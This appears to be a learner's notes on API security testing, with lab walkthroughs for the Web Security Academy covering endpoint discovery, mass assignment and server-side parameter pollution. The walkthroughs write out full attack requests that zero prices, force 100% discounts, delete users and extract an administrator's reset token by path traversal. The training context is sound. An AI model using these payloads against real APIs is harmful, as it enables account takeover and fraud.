## API recon

To start API testing, you first need to find out as much information about the API as possible, to discover its attack surface.

To begin, you should identify API endpoints. These are locations where an API receives requests about a specific resource on its server. For example, consider the following GET request:
```
GET /api/books HTTP/1.1
Host: example.com
```
The API endpoint for this request is **/api/books**. This results in an interaction with the API to retrieve a list of books from a library. Another API endpoint might be, for example, **/api/books/mystery**, which would retrieve a list of mystery books.

Once you have identified the endpoints, you need to determine how to interact with them. This enables you to construct valid HTTP requests to test the API. For example, you should find out information about the following:

-    The input data the API processes, including both compulsory and optional parameters.
-    The types of requests the API accepts, including supported HTTP methods and media formats.
-    Rate limits and authentication mechanisms.

### API documentation

APIs are usually documented so that developers know how to use and integrate with them.

Documentation can be in both human-readable and machine-readable forms. Human-readable documentation is designed for developers to understand how to use the API. It may include detailed explanations, examples, and usage scenarios. Machine-readable documentation is designed to be processed by software for automating tasks like API integration and validation. It's written in structured formats like JSON or XML.

API documentation is often publicly available, particularly if the API is intended for use by external developers. If this is the case, always start your recon by reviewing the documentation.


**Discovering API documentation**

Even if API documentation isn't openly available, you may still be able to access it by browsing applications that use the API.

To do this, you can use Burp Scanner to crawl the API. You can also browse applications manually using Burp's browser. Look for endpoints that may refer to API documentation, for example:

-    /api
-    /swagger/index.html
-    /openapi.json

If you identify an endpoint for a resource, make sure to investigate the base path. For example, if you identify the resource endpoint /api/swagger/v1/users/123, then you should investigate the following paths:

-    /api/swagger/v1
-    /api/swagger
-    /api

You can also use a list of common paths to find documentation using Intruder.


### Lab: Exploiting an API endpoint using documentation
To solve the lab, find the exposed API documentation and delete carlos. You can log in to your own account using the following credentials: wiener:peter. 

This request return the documentation of the api
```
GET /api/ HTTP/2
```

Send this requeset to solve the lab:
```
DELETE /api/user/carlos HTTP/2
```

### Using machine-readable documentation

You can use a range of automated tools to analyze any machine-readable API documentation that you find.

You can use Burp Scanner to crawl and audit OpenAPI documentation, or any other documentation in JSON or YAML format. You can also parse OpenAPI documentation using the OpenAPI Parser BApp.

You may also be able to use a specialized tool to test the documented endpoints, such as Postman or SoapUI.


**Identifying API endpoints**

You can also gather a lot of information by browsing applications that use the API. This is often worth doing even if you have access to API documentation, as sometimes documentation may be inaccurate or out of date.

You can use Burp Scanner to crawl the application, then manually investigate interesting attack surface using Burp's browser.

While browsing the application, look for patterns that suggest API endpoints in the URL structure, such as /api/. Also look out for JavaScript files. These can contain references to API endpoints that you haven't triggered directly via the web browser. Burp Scanner automatically extracts some endpoints during crawls, but for a more heavyweight extraction, use the JS Link Finder BApp. You can also manually review JavaScript files in Burp.

**Identifying supported HTTP methods**

The HTTP method specifies the action to be performed on a resource. For example:

-    GET - Retrieves data from a resource.
-    PATCH - Applies partial changes to a resource.
-    OPTIONS - Retrieves information on the types of request methods that can be used on a resource.

An API endpoint may support different HTTP methods. It's therefore important to test all potential methods when you're investigating API endpoints. This may enable you to identify additional endpoint functionality, opening up more attack surface.

For example, the endpoint /api/tasks may support the following methods:

-    GET /api/tasks - Retrieves a list of tasks.
-    POST /api/tasks - Creates a new task.
-    DELETE /api/tasks/1 - Deletes a task.

API endpoints often expect data in a specific format. They may therefore behave differently depending on the content type of the data provided in a request. Changing the content type may enable you to:

-    Trigger errors that disclose useful information.
-    Bypass flawed defenses.
-    Take advantage of differences in processing logic. For example, an API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.

To change the content type, modify the Content-Type header, then reformat the request body accordingly. You can use the Content type converter BApp to automatically convert data submitted within requests between XML and JSON. 

### Lab: Finding and exploiting an unused API endpoint

To solve the lab, exploit a hidden API endpoint to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: wiener:peter. 

This request return the following reponse:
```
OPTIONS /api/products/1/price HTTP/2
```
```
HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```
Then, I tried:
```
PATCH /api/products/1/price HTTP/2
```
```json
{"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}
```
Next request:
```
PATCH /api/products/1/price HTTP/2
Host: 0a2a0018042fdb4c85629c4a0036000a.web-security-academy.net
Cookie: session=XgVAd2q4Vzt5nvqILgy7v5yqEf6QF9nc
Content-Type: application/json
Content-Length: 15

{"test":"test"}
```
```json
{"type":"ClientError","code":400,"error":"'price' parameter missing in body"}
```
Final request to solve the lab:
```
PATCH /api/products/1/price HTTP/2
Host: 0a2a0018042fdb4c85629c4a0036000a.web-security-academy.net
Cookie: session=XgVAd2q4Vzt5nvqILgy7v5yqEf6QF9nc
Content-Type: application/json
Content-Length: 11

{"price":0}
```
### Using Intruder to find hidden endpoints

Once you have identified some initial API endpoints, you can use Intruder to uncover hidden endpoints. For example, consider a scenario where you have identified the following API endpoint for updating user information:
```
PUT /api/user/update
```
To identify hidden endpoints, you could use Burp Intruder to find other resources with the same structure. For example, you could add a payload to the /update position of the path with a list of other common functions, such as delete and add.

When looking for hidden endpoints, use wordlists based on common API naming conventions and industry terms. Make sure you also include terms that are relevant to the application, based on your initial recon.

## Finding hidden parameters

When you're doing API recon, you may find undocumented parameters that the API supports. You can attempt to use these to change the application's behavior. Burp includes numerous tools that can help you identify hidden parameters:

-    Burp Intruder enables you to automatically discover hidden parameters, using a wordlist of common parameter names to replace existing parameters or add new parameters. Make sure you also include names that are relevant to the application, based on your initial recon.
-    The Param miner BApp enables you to automatically guess up to 65,536 param names per request. Param miner automatically guesses names that are relevant to the application, based on information taken from the scope.
-    The Content discovery tool enables you to discover content that isn't linked from visible content that you can browse to, including parameters.


### Mass assignment vulnerabilities

Mass assignment (also known as auto-binding) can inadvertently create hidden parameters. It occurs when software frameworks automatically bind request parameters to fields on an internal object. Mass assignment may therefore result in the application supporting parameters that were never intended to be processed by the developer.

Since mass assignment creates parameters from object fields, you can often identify these hidden parameters by manually examining objects returned by the API.

For example, consider a **PATCH /api/users/** request, which enables users to update their username and email, and includes the following JSON:
```json
{
    "username": "wiener",
    "email": "wiener@example.com",
}
```
A concurrent **GET /api/users/123** request returns the following JSON:
```json
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```
This may indicate that the hidden id and isAdmin parameters are bound to the internal user object, alongside the updated username and email parameters.



To test whether you can modify the enumerated isAdmin parameter value, add it to the PATCH request:
```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": false,
}
```
In addition, send a PATCH request with an invalid isAdmin parameter value:
```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": "foo",
}
```
If the application behaves differently, this may suggest that the invalid value impacts the query logic, but the valid value doesn't. This may indicate that the parameter can be successfully updated by the user.

You can then send a PATCH request with the isAdmin parameter value set to true, to try and exploit the vulnerability:
```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true,
}
```
If the isAdmin value in the request is bound to the user object without adequate validation and sanitization, the user wiener may be incorrectly granted admin privileges. To determine whether this is the case, browse the application as wiener to see whether you can access admin functionality. 

### Lab: Exploiting a mass assignment vulnerability
To solve the lab, find and exploit a mass assignment vulnerability to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: wiener:peter. 

This request return:
```
GET /api/checkout HTTP/2
Host: 0a9700660349645882ae5116000e0016.web-security-academy.net
Cookie: session=pcPAW0nq3XAZF9iRWfMt0pRPYFboS8Uf
```
```json
{
    "chosen_discount":{
        "percentage":0
        },
        "chosen_products":[
            {
                "product_id":"1",
                "name":"Lightweight \"l33t\" Leather Jacket",
                "quantity":1,
                "item_price":133700
            }
        ]
}
```

Final request to solve the lab:
```
POST /api/checkout HTTP/2
Host: 0a9700660349645882ae5116000e0016.web-security-academy.net
Cookie: session=pcPAW0nq3XAZF9iRWfMt0pRPYFboS8Uf
Content-Length: 155

{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```
## Server-side parameter pollution

Some systems contain internal APIs that aren't directly accessible from the internet. Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding. This means that an attacker may be able to manipulate or inject parameters, which may enable them to, for example:

-    Override existing parameters.
-    Modify the application behavior.
-    Access unauthorized data.
### Testing for server-side parameter pollution in the query string

To test for server-side parameter pollution in the query string, place query syntax characters like #, &, and = in your input and observe how the application responds.

Consider a vulnerable application that enables you to search for other users based on their username. When you search for a user, your browser makes the following request:
```
GET /userSearch?name=peter&back=/home
```
To retrieve user information, the server queries an internal API with the following request:
```
GET /users/search?name=peter&publicProfile=true 
```
### Truncating query strings

You can use a URL-encoded # character to attempt to truncate the server-side request. To help you interpret the response, you could also add a string after the # character.

For example, you could modify the query string to the following:
```
GET /userSearch?name=peter%23foo&back=/home
```
The front-end will try to access the following URL:
```
GET /users/search?name=peter#foo&publicProfile=true
```


>It's essential that you URL-encode the # character. Otherwise the front-end application will interpret it as a fragment identifier and it won't be passed to the internal API.

Review the response for clues about whether the query has been truncated. For example, if the response returns the user peter, the server-side query may have been truncated. If an Invalid name error message is returned, the application may have treated foo as part of the username. This suggests that the server-side request may not have been truncated.

If you're able to truncate the server-side request, this removes the requirement for the publicProfile field to be set to true. You may be able to exploit this to return non-public user profiles.
### Injecting invalid parameters

You can use an URL-encoded & character to attempt to add a second parameter to the server-side request.

For example, you could modify the query string to the following:
```
GET /userSearch?name=peter%26foo=xyz&back=/home
```
This results in the following server-side request to the internal API:
```
GET /users/search?name=peter&foo=xyz&publicProfile=true
```
Review the response for clues about how the additional parameter is parsed. For example, if the response is unchanged this may indicate that the parameter was successfully injected but ignored by the application.

To build up a more complete picture, you'll need to test further.

### Injecting valid parameters

If you're able to modify the query string, you can then attempt to add a second valid parameter to the server-side request.
Related pages

For information on how to identify parameters that you can inject into the query string, see the Finding hidden parameters section.

For example, if you've identified the email parameter, you could add it to the query string as follows:
```
GET /userSearch?name=peter%26email=foo&back=/home
```
This results in the following server-side request to the internal API:
```
GET /users/search?name=peter&email=foo&publicProfile=true
```
Review the response for clues about how the additional parameter is parsed.

### Overriding existing parameters

To confirm whether the application is vulnerable to server-side parameter pollution, you could try to override the original parameter. Do this by injecting a second parameter with the same name.

For example, you could modify the query string to the following:
```
GET /userSearch?name=peter%26name=carlos&back=/home
```
This results in the following server-side request to the internal API:
```
GET /users/search?name=peter&name=carlos&publicProfile=true
```
The internal API interprets two name parameters. The impact of this depends on how the application processes the second parameter. This varies across different web technologies. For example:

 -   PHP parses the last parameter only. This would result in a user search for carlos.
 -   ASP.NET combines both parameters. This would result in a user search for peter,carlos, which might result in an Invalid username error message.
 -   Node.js / express parses the first parameter only. This would result in a user search for peter, giving an unchanged result.

If you're able to override the original parameter, you may be able to conduct an exploit. For example, you could add name=administrator to the request. This may enable you to log in as the administrator user.
### Lab: Exploiting server-side parameter pollution in a query string

To solve the lab, log in as the administrator and delete carlos. 

ForgotPassword.js:
<detail>
<summary>Click to expand</summary>

```js
let forgotPwdReady = (callback) => {
    if (document.readyState !== "loading") callback();
    else document.addEventListener("DOMContentLoaded", callback);
}

function urlencodeFormData(fd){
    let s = '';
    function encode(s){ return encodeURIComponent(s).replace(/%20/g,'+'); }
    for(let pair of fd.entries()){
        if(typeof pair[1]=='string'){
            s += (s?'&':'') + encode(pair[0])+'='+encode(pair[1]);
        }
    }
    return s;
}

const validateInputsAndCreateMsg = () => {
    try {
        const forgotPasswordError = document.getElementById("forgot-password-error");
        forgotPasswordError.textContent = "";
        const forgotPasswordForm = document.getElementById("forgot-password-form");
        const usernameInput = document.getElementsByName("username").item(0);
        if (usernameInput && !usernameInput.checkValidity()) {
            usernameInput.reportValidity();
            return;
        }
        const formData = new FormData(forgotPasswordForm);
        const config = {
            method: "POST",
            headers: {
                "Content-Type": "x-www-form-urlencoded",
            },
            body: urlencodeFormData(formData)
        };
        fetch(window.location.pathname, config)
            .then(response => response.json())
            .then(jsonResponse => {
                if (!jsonResponse.hasOwnProperty("result"))
                {
                    forgotPasswordError.textContent = "Invalid username";
                }
                else
                {
                    forgotPasswordError.textContent = `Please check your email: "${jsonResponse.result}"`;
                    forgotPasswordForm.className = "";
                    forgotPasswordForm.style.display = "none";
                }
            })
            .catch(err => {
                forgotPasswordError.textContent = "Invalid username";
            });
    } catch (error) {
        console.error("Unexpected Error:", error);
    }
}

const displayMsg = (e) => {
    e.preventDefault();
    validateInputsAndCreateMsg(e);
};

forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});
```
</detail>

This request indicate that the back-end may have interpreted &foo=bar as a separate parameter, instead of part of the username. :
```
POST /forgot-password HTTP/2
Host: 0a960003036333d38490ef4500870095.web-security-academy.net
Cookie: session=Klz9MkBvSewQmAqXzsYNASMlnwBbdKih
Content-Length: 70
Content-Type: x-www-form-urlencoded

csrf=...&username=administrator%26foo=bar
```
```json
{"error": "Parameter is not supported."}
```
Use the **Server-side variable names** payload list. I can fuff a valid type which is **field**
```
POST /forgot-password HTTP/2
Host: 0a960003036333d38490ef4500870095.web-security-academy.net
Cookie: session=Klz9MkBvSewQmAqXzsYNASMlnwBbdKih
Content-Length: 72
Content-Type: x-www-form-urlencoded

csrf=...&username=administrator%26field=bar
```
```json
{"type":"ClientError","code":400,"error":"Invalid field."}
```
Continue fuzzing the param, the above list return 4 abnormal response: **username, email, type, error**. Example:
```
POST /forgot-password HTTP/2
Host: 0a960003036333d38490ef4500870095.web-security-academy.net
Cookie: session=Klz9MkBvSewQmAqXzsYNASMlnwBbdKih
Content-Length: 74
Content-Type: x-www-form-urlencoded
Connection: keep-alive

csrf=jbqrLu7gaAD8KZ6vqSh6UkSe8KhCBnPn&username=administrator%26field=email
```
```json
{"result":"*****@normal-user.net","type":"email"}
```
Noticed that in the **forgotPassword.js**, there maybe a valid param, which is **reset_token**
```js
forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});
```
Attempt to send the request:
```
POST /forgot-password HTTP/2
Host: 0a960003036333d38490ef4500870095.web-security-academy.net
Cookie: session=Klz9MkBvSewQmAqXzsYNASMlnwBbdKih
Content-Length: 80
Content-Type: x-www-form-urlencoded

csrf=...&username=administrator%26field=reset_token
```
```json
{"result":"n0i2zmu8gah9th9l59hote2mdwk8idm7","type":"reset_token"}
```
To login as admin and solve the lab:
```
POST /forgot-password?reset_token=n0i2zmu8gah9th9l59hote2mdwk8idm7 HTTP/2
```
## Testing for server-side parameter pollution in REST paths

A RESTful API may place parameter names and values in the URL path, rather than the query string. For example, consider the following path:
```
/api/users/123
```
The URL path might be broken down as follows:

-    /api is the root API endpoint.
-    /users represents a resource, in this case users.
-    /123represents a parameter, here an identifier for the specific user.

Consider an application that enables you to edit user profiles based on their username. Requests are sent to the following endpoint:
```
GET /edit_profile.php?name=peter
```
This results in the following server-side request:
```
GET /api/private/users/peter
```
An attacker may be able to manipulate server-side URL path parameters to exploit the API. To test for this vulnerability, add path traversal sequences to modify parameters and observe how the application responds.

You could submit URL-encoded peter/../admin as the value of the name parameter:
```
GET /edit_profile.php?name=peter%2f..%2fadmin
```
This may result in the following server-side request:
```
GET /api/private/users/peter/../admin
```
If the server-side client or back-end API normalize this path, it may be resolved to **/api/private/users/admin**.
### Testing for server-side parameter pollution in structured data formats

An attacker may be able to manipulate parameters to exploit vulnerabilities in the server's processing of other structured data formats, such as a JSON or XML. To test for this, inject unexpected structured data into user inputs and see how the server responds.

Consider an application that enables users to edit their profile, then applies their changes with a request to a server-side API. When you edit your name, your browser makes the following request:
```
POST /myaccount
name=peter
```
This results in the following server-side request:
```
PATCH /users/7312/update
{"name":"peter"}
```
You can attempt to add the access_level parameter to the request as follows:
```
POST /myaccount
name=peter","access_level":"administrator
```
If the user input is added to the server-side JSON data without adequate validation or sanitization, this results in the following server-side request:
```
PATCH /users/7312/update
{name="peter","access_level":"administrator"}
```
This may result in the user peter being given administrator access. 



Consider a similar example, but where the client-side user input is in JSON data. When you edit your name, your browser makes the following request:
```
POST /myaccount
{"name": "peter"}
```
This results in the following server-side request:
```
PATCH /users/7312/update
{"name":"peter"}
```
You can attempt to add the access_level parameter to the request as follows:
```
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}
```
If the user input is decoded, then added to the server-side JSON data without adequate encoding, this results in the following server-side request:
```
PATCH /users/7312/update
{"name":"peter","access_level":"administrator"}
```
Again, this may result in the user peter being given administrator access. 
### Lab: Exploiting server-side parameter pollution in a REST URL

To solve the lab, log in as the administrator and delete carlos. 

Base on the name of the challenge, I guessed that the username param should be in a url

Attempt to send the request:
```
POST /forgot-password HTTP/2
Host: 0aa30016049e20128205d8d3000a0045.web-security-academy.net
Cookie: session=nb16w3pRozWy6osZy77N5kAeTeqqTs70
Content-Length: 71
Content-Type: x-www-form-urlencoded

csrf=et7lZKGTmRM2VrDZH3kOb4qGrxGBCbPG&username=../../../../openapi.json
```
```
HTTP/2 500 Internal Server Error
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 250

{
  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}
```
Which is
```html
<html>
<head>
    <meta charset="UTF-8">
    <title>Not Found</title>
</head>
<body>
    <h1>Not found</h1>
    <p>The URL that you requested was not found.</p>
</body>
</html>
```
Try adding `#` or `?` return
```json

{
  "openapi": "3.0.0",
  "info": {
    "title": "User API",
    "version": "2.0.0"
  },
  "paths": {
    "/api/internal/v1/users/{username}/field/{field}": {
      "get": {
        "tags": [
          "users"
        ],
        "summary": "Find user by username",
        "description": "API Version 1",
        "parameters": [
          {
            "name": "username",
            "in": "path",
            "description": "Username",
            "required": true,
            "schema": {
        ...
```
To get the **passwordResetToken** in the forgotPassword.js, send the following payload:
```
POST /forgot-password HTTP/2
Host: 0aa30016049e20128205d8d3000a0045.web-security-academy.net
Cookie: session=nb16w3pRozWy6osZy77N5kAeTeqqTs70
Content-Length: 103
Content-Type: x-www-form-urlencoded

csrf=...&username=../../v1/users/administrator/field/passwordResetToken%23
```
```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 82

{
  "type": "passwordResetToken",
  "result": "3qzw1v1te9vtksz4efuuqkewg4nme5bj"
}
```
To login as administrator and solve the lab, send:
```
POST /forgot-password?passwordResetToken=snj8xba1of02zd0k7n5knwqu9q1lkwcb HTTP/2
```